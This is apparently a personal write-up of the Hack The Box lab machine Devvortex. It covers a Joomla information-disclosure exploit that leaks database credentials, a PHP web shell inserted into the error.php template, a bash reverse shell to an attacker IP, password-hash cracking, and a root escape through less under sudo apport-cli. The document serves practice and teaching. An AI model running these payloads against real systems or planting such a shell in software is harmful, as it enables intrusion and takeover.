202312202013
Status: #less #disclosure #sudo #apport #db #joomla #template #php
Tags: [[Labs]], [[htb]]

# Devvortex
IP: 10.10.11.242

## Recon

Ports Open:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Port 80:

- Redirecting to `http://devvortex.htb/`
- Fuzzed for subdomains using ffuf:

```
dev     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 76ms]
```

Port 80 - Dev:

- Robots.txt file indicates possible usage of joomla

```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/ ## resolves to a login portal
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

- After fuzzing for directories, we find a `README.txt` file
- This file contained a hint as to what the version of Joomla was: 4.x
- With this in mind, we use searchsploit to see what vulnerabilities Joomla has and discover an interesting one:

```
Joomla! v4.2.8 - Unauthenticated information disclosure
```

- Looking at the script, we see that an api endpoint discloses highly sensitive information: `/api/index.php/v1/users?public=true`
- Using the script will scrape the contents of this endpoint and grab key data:

```
DB user: lewis    
DB password: P4ntherg0t1n5r3c0n##
```

- We utilized these found credentials on the Joomla login portal and found that it worked
- Lewis is a superuser account 
- Since we are a superuser, we can edit php code for templates
- We edit the `error.php` page so that we can easily call this page on error

```php
<?php
	system($_GET['pwned']);
?>
```

![[devvortex_template.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/devvortex_template.png">

- Now we can visit any nonexistent page and it will throw that error page at us with our injected php code:

![[devvortex_rce.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/devvortex_rce.png">

- With RCE present, we can get a reverse shell:

```
bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1' ## We need to URL encode this.
```

- Now that we are in, it seems that there is only one user: `logan`
- We know that we have DB credentials
- We are able to authenticate and found a users table in the joomla db
- We extracted logan's password hash and we were able to crack it using hashcat:

![[devvortex_crack.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/devvortex_crack.png">

- Now we have logan's credentials: `logan:tequieromucho`
- Some manual enumeration as logan reveals that logan can run sudo for a specific binary:

![[devvortex_sudo.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/devvortex_sudo.png">

- We were able to understand the functionality of the `apport-cli` binary
- This binary utilizes less as its interpreter
- We were able to get into a less prompt that read a report within the functionality of the binary
- Then we were able to escape this interpreter and get a root shell

```
# Inside the less interpreter
:!sh
```



---
# References

- Joomla! v4.2.8 - Unauthenticated information disclosure: https://www.exploit-db.com/exploits/51334